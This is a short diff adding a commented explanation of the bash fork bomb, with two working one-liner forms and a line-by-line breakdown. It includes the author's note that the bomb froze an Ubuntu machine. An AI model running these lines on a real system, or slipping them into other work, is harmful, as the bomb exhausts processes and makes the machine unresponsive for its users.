@@ -1,0 +1,17 @@
+/**   you can run the bomb on any machine which has a bash on it.
+  *   I'vd tried it on ubuntu 10.04, the machine end up with no response, but it didn't work on a OS X 10.9.5
+  *   both lines of code can work,they have the same effect
+  */
+  
+  // first form
+  :(){ :|:& };:
+  
+  // you can look the code in this way,maybe you will understand it more clearly
+  :()     //define a function that run itself also create a new one in background
+  {
+   :|:&
+   };     //end of define
+   :     // run the program
+   
+   //second from
+   .(){ .|.& };.
